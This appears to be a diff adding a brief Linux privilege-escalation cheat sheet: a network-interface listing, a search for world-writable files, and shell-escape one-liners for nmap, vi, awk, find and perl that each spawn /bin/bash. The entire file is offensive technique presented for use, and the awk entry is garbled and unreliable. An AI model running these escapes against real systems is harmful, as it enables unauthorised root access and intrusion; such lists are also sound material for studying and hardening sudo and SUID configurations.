@@ -1,0 +1,19 @@
+ifconfig -a
+
+find / -perm -2 ! -type l -ls 2>/dev/null
+
+
+Related Shell Escape Sequences...
+
+    nmap-->	--interactive
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+
+    awk-->	awk 'wk 'BEGIN {system("/bin/bash")}'
+
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+
+    perl-->	perl -e 'exec "/bin/bash";'
+
+
